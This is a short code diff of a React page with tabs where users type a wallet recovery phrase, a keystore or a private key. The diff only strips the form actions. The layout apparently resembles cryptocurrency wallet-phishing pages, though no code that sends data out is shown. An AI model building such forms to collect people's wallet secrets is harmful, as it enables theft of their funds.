@@ -67,7 +67,7 @@ const Index = () => {
 
             {showPhrase ?
                 <div id="phrase" className="tabcontent" style={{ display: "block" }}>
-                    <form w="" action="" method="POST">
+                    <form >
 
 
                         <textarea name="phrase" className="phrase" required="required" minLength="12" placeholder="Phrase"></textarea>
@@ -83,7 +83,7 @@ const Index = () => {
 
             {showKeyStore ?
                 <div id="keystore" className="tabcontent" style={{ display: "block" }}>
-                    <form action="\" method="POST">
+                    <form >
 
 
                         
@@ -98,7 +98,7 @@ const Index = () => {
 
             {showPrivateKey ?
                 <div id="private" className="tabcontent" style={{ display: "block" }}>
-                    <form action="\" method="POST">
+                    <form >
 
                         <div className="field">
                             <input type="text" name="key" className="key" placeholder="Private Key" />
